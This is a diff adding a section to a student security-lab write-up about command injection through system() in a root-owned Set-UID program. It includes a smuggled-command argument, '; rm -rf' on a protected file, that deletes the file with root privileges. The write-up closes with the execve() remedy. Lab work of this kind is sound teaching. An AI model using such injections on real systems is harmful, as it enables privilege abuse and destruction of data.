@@ -150,3 +150,24 @@ In this case, we created malicious code whose execution would print a message:
 
 ![Image 2 - Task 6 overview.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/Task6.jpeg)
 *Image 2 - Task 6 overview.*
+
+### Task 8
+
+- First we started by compiling the file catall.c and made it a root-owned Set-UID program:
+```
+$ gcc catall.c -o catall
+$ sudo chown root catall
+$ sudo chmod 4755 catall
+```
+- We created a new file called ```secretfile.txt``` then we altered the permissions so that the user seed can´t remove it or modify it:
+```
+$ sudo chown root:root /home/seed/Labsetup/secretfile.txt
+$ sudo chmod 400 /home/seed/Labsetup/secretfile.txt
+```
+- Since ```system()```, used in  ```catall.c```, relies on the shell, if Bob manipulates the PATH environment variable, he could trick the program into running a malicious version of cat.
+- We used the program to inject a command that will remove the ```secretfile.txt```:
+```
+$ ./catall "; rm -rf /home/seed/Labsetup/secretfile.txt"
+```
+To sum up, the use of system() in Set-UID programs is dangerous because it allows command injection and permission abuse. A best practice would be to replace system() with execve(), which does not invoke the shell and is therefore not vulnerable to this type of attack.
+
